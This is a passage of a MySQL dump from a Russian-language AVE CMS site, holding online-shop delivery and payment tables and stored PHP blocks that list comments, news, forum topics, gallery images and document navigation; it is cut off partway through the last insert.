INSERT INTO `cp_modul_shop_versandarten` VALUES (2, 'Курьером в подмосковье', 'Стоимость доставки за пределы МКАД - 200 рублей плюс: от 0 до 5 км - 50 рублей, от 5 до 10 км - 100 рублей, от 10 до 15 км - 150 рублей.', '', 'BY,RU,UA', 200.00, 1, 1, 0, '1,2,4,3');
INSERT INTO `cp_modul_shop_versandarten` VALUES (3, 'Почта России', '<br />', '', 'BY,RU,UA', 500.00, 1, 1, 0, '1,2,4,3');
INSERT INTO `cp_modul_shop_versandarten` VALUES (4, 'Самовывоз', '', '', '', 0.00, 0, 0, 0, '');

-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_modul_shop_versandkosten`
-- 

CREATE TABLE `cp_modul_shop_versandkosten` (
  `Id` int(10) unsigned NOT NULL auto_increment,
  `VersandId` int(10) unsigned NOT NULL default '0',
  `country` char(2) NOT NULL default 'RU',
  `KVon` decimal(8,3) NOT NULL default '0.001',
  `KBis` decimal(8,3) NOT NULL default '10.000',
  `Betrag` decimal(7,2) NOT NULL default '0.00',
  PRIMARY KEY  (`Id`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;

-- 
-- Дамп данных таблицы `cp_modul_shop_versandkosten`
-- 


-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_modul_shop_versandzeit`
-- 

CREATE TABLE `cp_modul_shop_versandzeit` (
  `Id` smallint(2) unsigned NOT NULL auto_increment,
  `Name` varchar(255) NOT NULL,
  `description` text NOT NULL,
  `Icon` varchar(255) NOT NULL,
  PRIMARY KEY  (`Id`)
) ENGINE=MyISAM AUTO_INCREMENT=5 DEFAULT CHARSET=cp1251;

-- 
-- Дамп данных таблицы `cp_modul_shop_versandzeit`
-- 

INSERT INTO `cp_modul_shop_versandzeit` VALUES (1, 'В течение 2-3 дней', '', '');
INSERT INTO `cp_modul_shop_versandzeit` VALUES (2, 'На следующий день по Москве', '', '');
INSERT INTO `cp_modul_shop_versandzeit` VALUES (3, '2-3 недели под заказ', '', '');
INSERT INTO `cp_modul_shop_versandzeit` VALUES (4, 'Доступно для скачивания сразу после оплаты', '', '');

-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_modul_shop_zahlungsmethoden`
-- 

CREATE TABLE `cp_modul_shop_zahlungsmethoden` (
  `Id` mediumint(5) unsigned NOT NULL auto_increment,
  `Name` varchar(255) NOT NULL,
  `description` text NOT NULL,
  `ErlaubteVersandLaender` tinytext NOT NULL,
  `ErlaubteVersandarten` tinytext NOT NULL,
  `ErlaubteGruppen` tinytext NOT NULL,
  `Aktiv` tinyint(1) unsigned NOT NULL default '0',
  `Kosten` decimal(7,2) NOT NULL default '0.00',
  `KostenOperant` enum('Wert','%') NOT NULL default 'Wert',
  `InstId` varchar(100) NOT NULL,
  `Modus` int(10) unsigned default NULL,
  `ZahlungsBetreff` varchar(255) NOT NULL,
  `TestModus` varchar(10) NOT NULL,
  `Extern` tinyint(1) unsigned default NULL,
  `Gateway` varchar(100) default NULL,
  `Position` mediumint(5) unsigned NOT NULL default '0',
  PRIMARY KEY  (`Id`),
  UNIQUE KEY `Name` (`Name`)
) ENGINE=MyISAM AUTO_INCREMENT=3 DEFAULT CHARSET=cp1251;

-- 
-- Дамп данных таблицы `cp_modul_shop_zahlungsmethoden`
-- 

INSERT INTO `cp_modul_shop_zahlungsmethoden` VALUES (1, 'Наличными курьеру', 'Наличные при получении (по Москве) - оплата осуществляется наличными деньгами курьеру в момент доставки. После комплектации заказа наш менеджер свяжется с Вами по контактному телефону и еще раз уточнит параметры заказа и Ваш адрес. Если Вы, подтвердив заказ, в дальнейшем отказываетесь от его получения, то Вам необходимо оплатить стоимость доставки + 50 руб за каждую возвращенную позицию. В случае необходимости возврата или обмена изделия свяжитесь с нашим менеджером.<br />', 'BY,RU,UA', '2,1', '1,2,4,3', 1, 0.00, 'Wert', '', NULL, '', '', 0, '', 0);
INSERT INTO `cp_modul_shop_zahlungsmethoden` VALUES (2, 'Безналичная оплата', 'Банковский платеж - после оформления заказа Вы сразу же можете распечатать квитанцию для оплаты через банк. Большая просьба - после осуществления перевода сразу уведомить нас об отправке денег по адресу e-mail. Мы сформируем и отправим Ваш заказ в течение 3-5 рабочих дней с момента поступления денег на наш расчетный счет. Если заказанного товара не окажется на складе, наш менеджер обязательно свяжется с Вами для разрешения возникшей ситуации. <br />', 'BY,RU,UA', '3', '1,2,4,3', 1, 13.00, '%', '', NULL, '', '', 0, '', 0);

-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_modul_sysblock`
-- 

CREATE TABLE `cp_modul_sysblock` (
  `id` mediumint(5) unsigned NOT NULL auto_increment,
  `sysblock_name` varchar(255) NOT NULL,
  `sysblock_text` longtext NOT NULL,
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=22 DEFAULT CHARSET=cp1251;

-- 
-- Дамп данных таблицы `cp_modul_sysblock`
-- 

INSERT INTO `cp_modul_sysblock` VALUES (1, 'Активные "комментаторы"', '<?php\r\n$limit = 5;\r\n$i = 0;\r\n$sql = $AVE_DB->Query("\r\n	SELECT \r\n		Author, \r\n		COUNT(Author_Id) AS comments\r\n	FROM " . PREFIX . "_modul_comment_info\r\n	WHERE Author_Id != ''0''\r\n	GROUP BY Author_Id\r\n	ORDER BY comments DESC\r\n	LIMIT " . $limit\r\n);\r\nwhile ($row = $sql->fetchrow())\r\n{\r\n	echo ''<strong>'', ++$i, '' место:</strong> '', htmlspecialchars($row->Author), \r\n		''<small style="text-align:right;">(Комментариев: '', \r\n		$row->comments, '')</small>'';\r\n}\r\n?>');
INSERT INTO `cp_modul_sysblock` VALUES (2, 'Последние комментарии', '<br />\r\n<?php\r\n$limit = 3;\r\n$sql = $AVE_DB->Query("\r\n	SELECT \r\n		cmnt.Author, \r\n		LEFT(cmnt.Text, 150) AS comment, \r\n		FROM_UNIXTIME(cmnt.Erstellt, ''%d.%m.%Y г. %H:%i'') AS date,\r\n		doc.Id,\r\n		doc.Titel, \r\n		doc.Url \r\n	FROM " . PREFIX . "_modul_comment_info AS cmnt \r\n	JOIN " . PREFIX . "_documents AS doc ON doc.Id = cmnt.DokId\r\n	WHERE Status = 1\r\n	ORDER BY cmnt.Id DESC \r\n	LIMIT " . $limit\r\n);\r\nwhile ($row = $sql->fetchrow())\r\n{\r\n	$Url = ''index.php?id='' . $row->Id . ''&amp;doc='' \r\n		. (empty($row->Url) ? cpParseLinkname(stripslashes($row->Titel)) : $row->Url);\r\n	$Url = (CP_REWRITE == 1) ? cpRewrite($Url) : $Url;\r\n	echo ''<p><small>Ответил:'', htmlspecialchars($row->Author), '' • '',$row->date,''</small><a title="'', htmlspecialchars($row->Titel),\r\n		''"href="'', $Url, ''"><em>"'', htmlspecialchars($row->comment), (strlen($row->comment)==150 ? ''...'' : ''''), \r\n		''"</em></a></p><hr/>'';\r\n}\r\n?>');
INSERT INTO `cp_modul_sysblock` VALUES (3, 'Популярные новости', '<?php\r\n$limit = 3; // Количество новостей в списке\r\n$i = 0;\r\n$sql = $AVE_DB->Query("\r\n	SELECT \r\n		COUNT(cmnt.Id) AS comments, \r\n		doc.Id, \r\n		doc.Titel, \r\n		doc.Url \r\n	FROM " . PREFIX . "_modul_comment_info AS cmnt\r\n	JOIN " . PREFIX . "_documents AS doc ON doc.Id = cmnt.DokId\r\n	GROUP BY cmnt.DokId \r\n	ORDER BY comments DESC \r\n	LIMIT " . $limit\r\n);\r\nwhile ($row = $sql->fetchrow())\r\n{\r\n	$Url = ''index.php?id='' . $row->Id . ''&amp;doc='' \r\n		. (empty($row->Url) ? cpParseLinkname(stripslashes($row->Titel)) : $row->Url);\r\n	$Url = (CP_REWRITE == 1) ? cpRewrite($Url) : $Url;\r\n	echo ''<strong>'', ++$i, ''.</strong> <a href="'', $Url, ''">'', \r\n		htmlspecialchars(substr($row->Titel, 0, 36)), ((strlen($row->Titel)>36) ? ''...'' : ''''), \r\n		''</a><p style="text-align:right;">(Комментариев: '', $row->comments, '')</p>'';\r\n}\r\n?>\r\n');
INSERT INTO `cp_modul_sysblock` VALUES (4, 'Случайный вывод фона в шапке', '<?php\r\n  $daten = file("uploads/random/header_fon.htm");\r\n  @shuffle ($daten);\r\n  echo trim($daten[0]);\r\n?>');
INSERT INTO `cp_modul_sysblock` VALUES (5, 'Текущая дата', '<?php\r  switch (date("F")){\r    case ''January'':   $month = ''января'';   break;\r    case ''February'':  $month = ''февраля'';  break;\r    case ''March'':     $month = ''марта'';    break;\r    case ''April'':     $month = ''апреля'';   break;\r    case ''May'':       $month = ''мая'';      break;\r    case ''June'':      $month = ''июня'';     break;\r    case ''July'':      $month = ''июля'';     break;\r    case ''August'':    $month = ''августа'';  break;\r    case ''September'': $month = ''сентября''; break;\r    case ''October'':   $month = ''октября'';  break;\r    case ''November'':  $month = ''ноября'';   break;\r    case ''December'':  $month = ''декабря'';  break;\r  }\r\r  switch (date("w")){\r    case ''0'': $day = ''Воскресенье''; break;\r    case ''1'': $day = ''Понедельник''; break;\r    case ''2'': $day = ''Вторник''; break;\r    case ''3'': $day = ''Среда''; break;\r    case ''4'': $day = ''Четверг''; break;\r    case ''5'': $day = ''Пятница''; break;\r    case ''6'': $day = ''Суббота''; break;\r  }\r\r  $now_date = date("$day, d ".$month." Y г.");\r  echo ''Сегодня: '' . $now_date;\r?>');
INSERT INTO `cp_modul_sysblock` VALUES (6, 'Случайная галерея', '<?php\r  $sql = $GLOBALS[''db'']->Query("SELECT Id FROM " . PREFIX . "_modul_gallery ORDER BY RAND() LIMIT 1");\r  $row = $sql->fetchrow();\r  include_once(BASE_DIR . ''/modules/gallery/modul.php'');\r  cpGallery($row->Id);\r?>');
INSERT INTO `cp_modul_sysblock` VALUES (7, 'Последние документы', '<div class="mod_searchbox"><strong>Последние документы</strong><br />\r<br />\r<?php\r  $limit = 5; // Количество документов в списке\r  $sql = $GLOBALS[''db'']->Query("SELECT * \r    FROM " . PREFIX . "_documents\r    WHERE Id != 1\r      AND Id != 2\r      AND Geloescht != 1\r      AND DokStatus != 0\r      AND (DokEnde = 0 || DokEnde > ".time().")\r      AND (DokStart = 0 || DokStart < ".time().")\r    ORDER BY DokStart DESC\r    LIMIT 0,$limit\r  ");\r  $outstring = '''';\r  $i = 0;\r  while ($row = $sql->fetchrow()) {\r    $Url = (CP_REWRITE==1) ? cp_rewrite(''index.php?id=''.$row->Id.''&amp;doc=''.cp_parse_linkname($row->Titel)) : ''index.php?id=''.$row->Id.''&amp;doc=''.cp_parse_linkname($row->Titel);\r    $outstring .= ''<strong>''.++$i.''.</strong> '';\r    $outstring .= ''<a href="''.$Url.''">''.substr($row->Titel, 0, 40).''''.((strlen($row->Titel)>40) ? ''...'' : '''').''</a><br />'';\r  }\r  $sql->Close();\r  echo $outstring;\r?></div>');
INSERT INTO `cp_modul_sysblock` VALUES (8, 'Форум: Популярные темы', '<div class="mod_searchbox"><strong>Популярные темы</strong><br />\r<br />\r<ol> <?php\r  $limit = 5;\r  $sql = $GLOBALS[''db'']->Query("\r    SELECT topic.id,forum_id,title,views,replies,datum,BenutzerId,BenutzerName\r    FROM " . PREFIX . "_modul_forum_topic AS topic\r    LEFT JOIN " . PREFIX . "_modul_forum_userprofile AS user ON user.BenutzerId = uid\r    WHERE opened = 1\r    ORDER BY views DESC\r    LIMIT 0,$limit\r  ");\r  $outstring = '''';\r  while ($row = $sql->FetchRow()) {\r    $outstring .= ''<li>'';\r    $outstring .= ''<strong><a href="index.php?module=forums&show=showtopic&toid=''.$row->id.''&fid=''.$row->forum_id.''">''.htmlentities(stripslashes($row->title), ENT_NOQUOTES, "cp1251").''</a></strong><br />'';\r    $outstring .= ''Тема cоздана ''.date_format(date_create($row->datum),"d-m-Y г. в H:i");\r    $outstring .= '' пользователем <a href="index.php?module=forums&show=userprofile&user_id=''.$row->BenutzerId.''" class="name">''.htmlentities(stripslashes($row->BenutzerName), ENT_NOQUOTES, "cp1251").''</a><br />'';\r    $outstring .= '' (просмотров: ''.$row->views;\r    $outstring .= '', сообщений: ''.$row->replies.'')'';\r    $outstring .= ''</li>'';\r  }\r  $sql->Close();\r  echo $outstring;\r?> </ol>\r    </div>');
INSERT INTO `cp_modul_sysblock` VALUES (9, 'Форум: Важные темы и объявления', '<div class="mod_searchbox"><strong>Важные темы и объявления</strong><br />\r<br />\r<ol> <?php\r// Для вывода только важных тем ипользовать WHERE type = 1\r// Для вывода только объявлений ипользовать WHERE type = 100\r// Для вывода важных тем и объявлений ипользовать WHERE type != 0\r  $limit = 10;\r  $sql = $GLOBALS[''db'']->Query("\r    SELECT topic.id,forum_id,title,views,replies,datum,BenutzerId,BenutzerName\r    FROM " . PREFIX . "_modul_forum_topic AS topic\r    LEFT JOIN " . PREFIX . "_modul_forum_userprofile AS user ON user.BenutzerId = uid\r    WHERE type != 0\r    ORDER BY views DESC\r    LIMIT 0,$limit\r  ");\r  $outstring = '''';\r  while ($row = $sql->FetchRow()) {\r    $outstring .= ''<li>'';\r    $outstring .= ''<strong><a href="index.php?module=forums&show=showtopic&toid=''.$row->id.''&fid=''.$row->forum_id.''">''.htmlentities(stripslashes($row->title), ENT_NOQUOTES, "cp1251").''</a></strong><br />'';\r    $outstring .= ''Тема cоздана ''.date_format(date_create($row->datum),"d-m-Y г. в H:i");\r    $outstring .= '' пользователем <a href="index.php?module=forums&show=userprofile&user_id=''.$row->BenutzerId.''" class="name">''.htmlentities(stripslashes($row->BenutzerName), ENT_NOQUOTES, "cp1251").''</a><br />'';\r    $outstring .= '' (просмотров: ''.$row->views;\r    $outstring .= '', сообщений: ''.$row->replies.'')'';\r    $outstring .= ''</li>'';\r  }\r  $sql->Close();\r  echo $outstring;\r?> </ol>\r    </div>');
INSERT INTO `cp_modul_sysblock` VALUES (10, 'Форум: Активные темы за последние 24 часа', '<?php\r  define ("MISCIDSINC", 1);\r  define ("FORUM_PERMISSION_CAN_SEE", 0);\r  define ("FORUM_STATUS_CLOSED", 1);\r  define ("FORUM_STATUS_MOVED", 2);\r  define ("BOARD_NEWPOSTMAXAGE", "-4 weeks");\r  define ("TOPIC_TYPE_STICKY", 1);\r  define ("TOPIC_TYPE_ANNOUNCE", 100);\r\r  include_once(BASE_DIR . ''/modules/forums/class.forums.php'');\r  include_once(BASE_DIR . ''/functions/func.modulglobals.php'');\r  if(defined(''T_PATH'')) $GLOBALS[''tmpl'']->assign(''cp_theme'', T_PATH);\r\r  modulGlobals(''forums'');\r\r  $forums = new Forum;\r\r  $GLOBALS[''tmpl'']->register_function(''get_post_icon'', ''getPostIcon'');\r\r  $GLOBALS[''mod''][''tpl_dir''] = BASE_DIR . ''/templates/''.T_PATH.''/modules/forums/templates/'';\r\r  $forums->last24();\r\r  echo MODULE_CONTENT;\r?>');
INSERT INTO `cp_modul_sysblock` VALUES (11, 'Случайный вывод текста в шапке', '<?php\r\n  $daten = file("uploads/random/header_text.htm");\r\n  @shuffle ($daten);\r\n  echo trim($daten[0]);\r\n?>');
INSERT INTO `cp_modul_sysblock` VALUES (12, 'Адрес внизу сайта', '<p>МойГород, ул. Ленина, д.1<br />\nтел./факс: (111) <strong>555-55-66</strong><br />\nEmail:<a href="mailto:info@mysite.ru"> info@mysite.ru</a></p>');
INSERT INTO `cp_modul_sysblock` VALUES (13, 'Объединённые блоки 1, 2 и 3 для левой панели', '<div class="searchbox">\r\n<h3>Популярные новости</h3>\r\n<?php\r\n$limit = 3; // Количество новостей в списке\r\n$i = 0;\r\n$sql = $AVE_DB->Query("\r\n	SELECT \r\n		COUNT(cmnt.Id) AS comments, \r\n		doc.Id, \r\n		doc.Titel, \r\n		doc.Url \r\n	FROM " . PREFIX . "_modul_comment_info AS cmnt\r\n	JOIN " . PREFIX . "_documents AS doc ON doc.Id = cmnt.document_id\r\n	GROUP BY cmnt.document_id \r\n	ORDER BY comments DESC \r\n	LIMIT " . $limit\r\n);\r\nwhile ($row = $sql->fetchrow())\r\n{\r\n	$Url = ''index.php?id='' . $row->Id . ''&amp;doc='' \r\n		. (empty($row->Url) ? cpParseLinkname(stripslashes($row->Titel)) : $row->Url);\r\n	$Url = (CP_REWRITE == 1) ? cpRewrite($Url) : $Url;\r\n	echo ''<strong>'', ++$i, ''.</strong> <a href="'', $Url, ''">'', \r\n		htmlspecialchars(substr($row->Titel, 0, 36)), ((strlen($row->Titel)>36) ? ''...'' : ''''), \r\n		''</a><p style="text-align:right;">(Комментариев: '', $row->comments, '')</p>'';\r\n}\r\n?></div>\r\n<div class="searchbox">\r\n<h3>Активные комментаторы</h3>\r\n<?php\r\n$limit = 5;\r\n$i = 0;\r\n$sql = $AVE_DB->Query("\r\n	SELECT \r\n		Author, \r\n		COUNT(author_id) AS comments\r\n	FROM " . PREFIX . "_modul_comment_info\r\n	WHERE author_id != ''0''\r\n	GROUP BY author_id\r\n	ORDER BY comments DESC\r\n	LIMIT " . $limit\r\n);\r\nwhile ($row = $sql->fetchrow())\r\n{\r\n	echo ''<strong>'', ++$i, '' место:</strong> '', htmlspecialchars($row->author), \r\n		''<br /><div style="text-align:right;font-size:11px;">(Комментариев: '', \r\n		$row->comments, '')</div>'';\r\n}\r\n?></div>\r\n<div class="searchbox">\r\n<h3>Новые комментарии:</h3>\r\n<?php\r\n$limit = 3;\r\n$sql = $AVE_DB->Query("\r\n	SELECT \r\n		cmnt.author, \r\n		LEFT(cmnt.message, 150) AS comment, \r\n		FROM_UNIXTIME(cmnt.published, ''%d.%m.%Y г. %H:%i'') AS date,\r\n		doc.Id,\r\n		doc.Titel, \r\n		doc.Url \r\n	FROM " . PREFIX . "_modul_comment_info AS cmnt \r\n	JOIN " . PREFIX . "_documents AS doc ON doc.Id = cmnt.document_id\r\n	WHERE status = 1\r\n	ORDER BY cmnt.Id DESC \r\n	LIMIT " . $limit\r\n);\r\nwhile ($row = $sql->fetchrow())\r\n{\r\n	$Url = ''index.php?id='' . $row->Id . ''&amp;doc='' \r\n		. (empty($row->Url) ? cpParseLinkname(stripslashes($row->Titel)) : $row->Url);\r\n	$Url = (CP_REWRITE == 1) ? cpRewrite($Url) : $Url;\r\n	echo ''<small>Ответил:'', htmlspecialchars($row->author), ''<p>&quot;...<em>'', \r\n		htmlspecialchars($row->comment), (strlen($row->comment)==150 ? ''...'' : ''''), \r\n		''</em>&quot;</p><small>'', $row->date, '' | <a title="'', htmlspecialchars($row->Titel),\r\n		''" href="'', $Url, ''">Подробнее...</a></small></small><hr/>'';\r\n}\r\n?></div>');
INSERT INTO `cp_modul_sysblock` VALUES (14, 'Случайные изображения из галерей', '<?\r\nglobal $db;\r\n\r\nif (!function_exists(''imgType'')) \r\n{\r\n  function imgType($endg) \r\n  {\r\n    switch ($endg) {\r\n      case ''.jpg'' :\r\n      case ''jpeg'' :\r\n      case ''.jpe'' : $f_end = ''jpg''; break;\r\n      case ''.png'' : $f_end = ''png''; break;\r\n      case ''.gif'' : $f_end = ''gif''; break;\r\n      case ''.avi'' : $f_end = ''video''; break;\r\n      case ''.mov'' : $f_end = ''video''; break;\r\n      case ''.wmv'' : $f_end = ''video''; break;\r\n      case ''.wmf'' : $f_end = ''video''; break;\r\n      case ''.mpg'' : $f_end = ''video''; break;\r\n    }\r\n    return $f_end;\r\n  }\r\n}\r\n$sql = $db->Query("\r\n	SELECT \r\n		GalId, \r\n		GPfad, \r\n		Pfad, \r\n		Endung, \r\n		BildTitel \r\n	FROM " . PREFIX . "_modul_gallery_images \r\n	LEFT JOIN " . PREFIX . "_modul_gallery AS gal ON GalId = gal.Id \r\n	ORDER BY RAND() \r\n	LIMIT 4\r\n");\r\nwhile ($row = $sql->fetchrow()) {\r\n?><a onclick="popup(''index.php?module=gallery&amp;pop=1&amp;<?="s"?>ub=allimages&amp;gal_id=<?=$row->GalId?>&amp;cp_theme=<?=T_PATH?>'',''comment'',''720'',''750'',''1'');" href="javascript:void(0);"><img border="0" alt="<?=htmlspecialchars(stripslashes($row->BildTitel), ENT_QUOTES, ''cp1251'')?>" src="modules/gallery/thumb.php?file=<?=$row->Pfad?>&amp;type=<?=imgType($row->Endung)?>&amp;folder=<?=$row->GPfad?>" /></a><?}?>');
INSERT INTO `cp_modul_sysblock` VALUES (15, 'Шапка', '<?php\r\n  $bg_position = array(0,-130,-260,-390,-520,-650);\r\n  shuffle ($bg_position);\r\n\r\n  $top_message = array(''позволяет легко подключать новые шаблоны, сочетать их с любым дизайном, который только можно нарисовать.'', ''поддерживает бесконечное количество пользователей и определяет их во множество различных групп с возможностью рассылки пользователям писем.'', ''предоставляет Вам возможность широкого использования мета-данных. На любой странице  можно задать целый ряд необходимых тэгов.'', ''легкоосваиваемая система управления контентом. Всего за несколько приемов Вы сможете создать свою домашнюю страницу .'', ''содержит удобный модуль интернет-магазина. Отличное решение для быстрого начала бизнеса в интернете!'', ''удобная система управления контентом сайта. Принцип работы системы построен на модульности, благодаря чему она приобретает уникальную гибкость.'');\r\n  @shuffle ($top_message);\r\n\r\n  echo ''style="background: url(templates/aveold/images/fon_theme.jpg) no-repeat left '', $bg_position[0], ''px;"><div id="fon_login"><b>AVE CMS</b> - '', $top_message[0], ''</div'';\r\n?>');
INSERT INTO `cp_modul_sysblock` VALUES (16, 'Навигация по документам рубрики', '<?php\r\nglobal $db;\r\n\r\n$curent_doc_id = currentId();\r\n$sql = $db->Query("\r\n	(SELECT\r\n		''prev'' AS doc_type,\r\n		prev.Id,\r\n		prev.Titel,\r\n		doc_field.Inhalt\r\n	FROM\r\n		" . PREFIX . "_documents AS prev\r\n	LEFT JOIN \r\n		" . PREFIX . "_documents AS curent \r\n			ON curent.RubrikId = prev.RubrikId\r\n	LEFT JOIN \r\n		" . PREFIX . "_document_fields AS doc_field \r\n			ON doc_field.DokumentId = prev.Id\r\n	WHERE\r\n		prev.Id >  ''2'' AND\r\n		curent.Id =  ''" . $curent_doc_id . "'' AND\r\n		prev.Id <>  ''" . $curent_doc_id . "'' AND\r\n		prev.DokStart <=  curent.DokStart AND\r\n		doc_field.RubrikFeld = (\r\n			SELECT\r\n				rub_field.Id\r\n			FROM\r\n				" . PREFIX . "_document_fields AS doc_field\r\n			LEFT JOIN \r\n				" . PREFIX . "_rubric_fields AS rub_field \r\n					ON rub_field.Id = doc_field.RubrikFeld\r\n			WHERE\r\n				doc_field.DokumentId =  ''" . $curent_doc_id . "''\r\n			ORDER BY\r\n				rub_field.rubric_position ASC\r\n			LIMIT 1\r\n		)\r\n	ORDER BY\r\n		prev.DokStart DESC\r\n	LIMIT 1)\r\n	\r\n	UNION\r\n	\r\n	(SELECT\r\n		''next'' AS doc_type,\r\n		next.Id,\r\n		next.Titel,\r\n		doc_field.Inhalt\r\n	FROM\r\n		" . PREFIX . "_documents AS next\r\n	LEFT JOIN \r\n		" . PREFIX . "_documents AS curent \r\n			ON curent.RubrikId = next.RubrikId\r\n	LEFT JOIN \r\n		" . PREFIX . "_document_fields AS doc_field \r\n			ON doc_field.DokumentId = next.Id\r\n	WHERE\r\n		next.Id >  ''2'' AND\r\n		curent.Id =  ''" . $curent_doc_id . "'' AND\r\n		next.Id <>  ''" . $curent_doc_id . "'' AND\r\n		next.DokStart >=  curent.DokStart AND\r\n		doc_field.RubrikFeld = (\r\n			SELECT\r\n				rub_field.Id\r\n			FROM\r\n				" . PREFIX . "_document_fields AS doc_field\r\n			LEFT JOIN \r\n				" . PREFIX . "_rubric_fields AS rub_field \r\n					ON rub_field.Id = doc_field.RubrikFeld\r\n			WHERE\r\n				doc_field.DokumentId =  ''" . $curent_doc_id . "''\r\n			ORDER BY\r\n				rub_field.rubric_position ASC\r\n			LIMIT 1\r\n		)\r\n	ORDER BY\r\n		next.DokStart ASC\r\n	LIMIT 1)\r\n");\r\nwhile ($row = $sql->fetchRow())\r\n{\r\n	$doc_navi[$row->doc_type] = $row;\r\n}\r\necho ''<table cellspacing="0" cellpadding="0" border="0" width="100%" id="docnavi"><tr><td align="left" width="50%" class="naviprev">'';\r\nif (isset($doc_navi[''prev'']))\r\n{\r\n	$prev_url = ''index.php?id='' . $doc_navi[''prev'']->Id . ''&'' . ''amp;doc='' . cpParseLinkname($doc_navi[''prev'']->Titel);\r\n	$prev_url = (CP_REWRITE==1) ? cpRewrite($prev_url) : $prev_url;\r\n	$prev_linkname = htmlspecialchars($doc_navi[''prev'']->Inhalt);\r\n	echo ''&larr;&nbsp;<a title="'', $prev_linkname, ''" href="'', $prev_url, ''">'', $prev_linkname, ''</a>''; \r\n}\r\necho ''</td><td align="right" width="50%" class="navinext">'';\r\nif (isset($doc_navi[''next'']))\r\n{\r\n	$next_url = ''index.php?id='' . $doc_navi[''next'']->Id . ''&'' . ''amp;doc='' . cpParseLinkname($doc_navi[''next'']->Titel);\r\n	$next_url = (CP_REWRITE==1) ? cpRewrite($next_url) : $next_url;\r\n	$next_linkname = htmlspecialchars($doc_navi[''next'']->Inhalt);\r\n	echo ''<a title="'', $next_linkname, ''" href="'', $next_url, ''">'', $next_linkname, ''</a>&nbsp;&rarr;''; \r\n}\r\necho ''</td></tr></table>'';\r\n?>');
INSERT INTO `cp_modul_sysblock` VALUES (17, 'Навигация по документам рубрики 2', '<?php\r\nglobal $db;\r\n\r\n$row_cur_doc = $db->Query("\r\n	SELECT \r\n		Id,\r\n		RubrikId,\r\n		DokStart\r\n	FROM \r\n		" . PREFIX . "_documents\r\n	WHERE \r\n		Id =  ''" . currentId() . "''\r\n")\r\n->fetchRow();\r\n\r\n$row = $db->Query("\r\n	SELECT Id\r\n	FROM " . PREFIX . "_rubric_fields\r\n	WHERE RubrikId = ''" . $row_cur_doc->RubrikId . "''\r\n	ORDER BY rubric_position ASC\r\n	LIMIT 1\r\n")\r\n->fetchRow();\r\n\r\n$doc_field_titel_id = $row->Id;\r\n$row_prev = $db->Query("\r\n	SELECT\r\n		Id,\r\n		Titel\r\n	FROM\r\n		" . PREFIX . "_documents\r\n	WHERE\r\n		Id > ''2'' AND\r\n		Id != ''" . $row_cur_doc->Id . "'' AND\r\n		RubrikId = ''" . $row_cur_doc->RubrikId . "'' AND\r\n		DokStart <= ''" . $row_cur_doc->DokStart . "''\r\n	ORDER BY\r\n		DokStart DESC\r\n	LIMIT 1\r\n")\r\n->fetchRow();\r\nif ($row_prev)\r\n{\r\n	$row = $db->Query("\r\n		SELECT Inhalt\r\n		FROM " . PREFIX . "_document_fields\r\n		WHERE\r\n			RubrikFeld = ''" . $doc_field_titel_id . "'' AND\r\n			DokumentId = ''" . $row_prev->Id . "''\r\n	")	\r\n	->fetchRow();\r\n	$row_prev->Inhalt = $row->Inhalt;\r\n}\r\n$row_next = $db->Query("\r\n	SELECT\r\n		Id,\r\n		Titel\r\n	FROM\r\n		" . PREFIX . "_documents\r\n	WHERE\r\n		Id >  ''2'' AND\r\n		Id != ''" . $row_cur_doc->Id . "'' AND\r\n		RubrikId = ''" . $row_cur_doc->RubrikId . "'' AND\r\n		DokStart >= ''" . $row_cur_doc->DokStart . "''\r\n	ORDER BY\r\n		DokStart ASC\r\n	LIMIT 1\r\n")\r\n->fetchRow();\r\nif ($row_next)\r\n{\r\n	$row = $db->Query("\r\n		SELECT Inhalt\r\n		FROM " . PREFIX . "_document_fields\r\n		WHERE\r\n			RubrikFeld = ''" . $doc_field_titel_id . "'' AND\r\n			DokumentId = ''" . $row_next->Id . "''\r\n	")\r\n	->fetchRow();\r\n	$row_next->Inhalt = $row->Inhalt;\r\n}\r\necho ''<table cellspacing="0" cellpadding="0" border="0" width="100%" id="docnavi"><tr><td align="left" width="50%" class="naviprev">'';\r\nif ($row_prev)\r\n{\r\n	$prev_url = ''index.php?id='' . $row_prev->Id . ''&'' . ''amp;doc='' . cpParseLinkname($row_prev->Titel);\r\n	$prev_url = (CP_REWRITE==1) ? cpRewrite($prev_url) : $prev_url;\r\n	$prev_linkname = htmlspecialchars($row_prev->Inhalt);\r\n	echo ''&larr;&nbsp;<a title="'', $prev_linkname, ''" href="'', $prev_url, ''">'', $prev_linkname, ''</a>''; \r\n}\r\necho ''</td><td align="right" width="50%" class="navinext">'';\r\nif ($row_next)\r\n{\r\n	$next_url = ''index.php?id='' . $row_next->Id . ''&'' . ''amp;doc='' . cpParseLinkname($row_next->Titel);\r\n	$next_url = (CP_REWRITE==1) ? cpRewrite($next_url) : $next_url;\r\n	$next_linkname = htmlspecialchars($row_next->Inhalt);\r\n	echo ''<a title="'', $next_linkname, ''" href="'', $next_url, ''">'', $next_linkname, ''</a>&nbsp;&rarr;''; \r\n}\r\necho ''</td></tr></table>'';\r\n?>');
INSERT INTO `cp_modul_sysblock` VALUES (18, 'Навигация по документам рубрики 3', '<?php\r\nglobal $db;\r\n\r\n$curent_doc_id = currentDocId();\r\n\r\n$row_cur = $AVE_DB->Query("\r\n	SELECT \r\n		rub.Id,\r\n		doc.RubrikId,\r\n		doc.DokStart\r\n	FROM \r\n		" . PREFIX . "_documents AS doc\r\n	JOIN\r\n		" . PREFIX . "_rubric_fields AS rub\r\n			USING(RubrikId)\r\n	WHERE \r\n		doc.Id =  ''" . $curent_doc_id . "''\r\n	ORDER BY \r\n		rubric_position ASC\r\n	LIMIT 1\r\n")\r\n->fetchRow();\r\n\r\n$row_prev = $AVE_DB->Query("\r\n	SELECT\r\n		doc.Id,\r\n		Titel,\r\n		Inhalt\r\n	FROM\r\n		cp_documents AS doc\r\n	JOIN\r\n		cp_document_fields AS fld\r\n			ON DokumentId = doc.Id\r\n	WHERE\r\n		doc.Id > ''2'' AND\r\n		doc.Id != ''" . $curent_doc_id . "'' AND\r\n		RubrikId = ''" . $row_cur->RubrikId . "'' AND\r\n		DokStart <= ''" . $row_cur->DokStart . "'' AND \r\n		RubrikFeld = ''" . $row_cur->Id . "''\r\n	ORDER BY\r\n		DokStart DESC\r\n	LIMIT 